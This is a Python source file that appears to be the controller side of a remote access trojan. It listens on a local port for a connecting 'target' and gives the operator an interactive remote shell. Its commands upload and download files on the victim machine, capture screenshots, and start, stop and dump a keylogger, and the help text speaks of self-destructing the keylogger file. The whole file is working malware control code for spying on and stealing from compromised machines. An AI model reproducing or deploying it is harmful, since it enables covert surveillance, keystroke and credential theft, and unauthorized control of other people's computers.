import socket
import termcolor
import json
import os
# #
# #


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
# #


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())
#


def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
#


def target_communication():
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == "keylogger_start":
            print("started")
        elif command == "keylogger_stop":
            print("stopped")
        elif command == "keylogger_dump":
            download_file("keylog")

            #
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                            --->Quit Session with the Target
            clear                           --->Clear the Screen
            cd *Directory name*             --->Change Directory on Target System
            upload *File Name*              --->Upload file to the Target Machine
            download *File Name*            --->Download file from the Target Machine
            keylogger_start                 --->Start the keyLogger
            keylog_dump                     --->Print the keystroke that the target Inputted.
            keylog_stop                     --->Stop and Self destruct Keylogger File'''),
                  'red')
        else:
            result = reliable_recv()
            print(result)


# #
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))
# sock.bind(('192.168.0.7', 5555))
print(termcolor.colored(
    '[ + ] Listening for the incoming Connection', 'green'))
sock.listen(5)
# Inside target we have socket discriptor which we are using for further connection, and inside ip there is IP address of target machine
target, ip = sock.accept()
print(termcolor.colored('[ + ] Target connected From: ' + str(ip), 'green'))
# #
# #
# #
target_communication()
